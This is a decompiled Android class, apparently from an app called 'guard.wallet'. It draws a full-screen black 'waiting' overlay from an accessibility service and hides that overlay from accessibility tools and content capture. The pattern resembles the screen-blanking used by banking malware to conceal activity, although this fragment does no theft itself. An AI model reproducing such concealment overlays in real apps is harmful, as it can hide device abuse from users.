package e0;

import a1.AbstractC0026q;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.support.v4.view.ViewCompat;
import android.view.View;
import android.widget.LinearLayout;
import com.guard.wallet.service.MyAccessibilityService;
import java.lang.ref.WeakReference;
import java.util.Objects;

/* renamed from: e0.g */
/* loaded from: classes.dex */
public final class C0269g extends LinearLayout {

    /* renamed from: a */
    public WeakReference f451a;

    public C0269g(MyAccessibilityService myAccessibilityService, String str, Drawable drawable) {
        super(myAccessibilityService);
        boolean z2 = true;
        setOrientation(1);
        setGravity(17);
        setSystemUiVisibility(4);
        setImportantForAccessibility(2);
        if (Build.VERSION.SDK_INT >= 30) {
            setImportantForContentCapture(2);
        }
        if (drawable != null) {
            setBackground(drawable);
        } else {
            z2 = false;
        }
        if (!z2) {
            setBackgroundColor(ViewCompat.MEASURED_STATE_MASK);
        }
        getViewTreeObserver().addOnGlobalLayoutListener(new ViewTreeObserverOnGlobalLayoutListenerC0270h(this));
        if (AbstractC0026q.m151B(str)) {
            return;
        }
        C0271i c0271i = new C0271i(myAccessibilityService, str);
        c0271i.setTag("waiting-block-view");
        addView(c0271i, 0);
        this.f451a = new WeakReference(c0271i);
    }

    @Override // android.widget.LinearLayout, android.view.ViewGroup, android.view.View
    public final void onLayout(boolean z2, int i2, int i3, int i4, int i5) {
        int childCount = getChildCount();
        if (childCount > 0) {
            for (int i6 = 0; i6 < childCount; i6++) {
                View childAt = getChildAt(i6);
                if (Objects.equals(childAt.getTag(), "waiting-block-view")) {
                    childAt.layout(i2, i3, i4, i5);
                }
            }
        }
    }
}
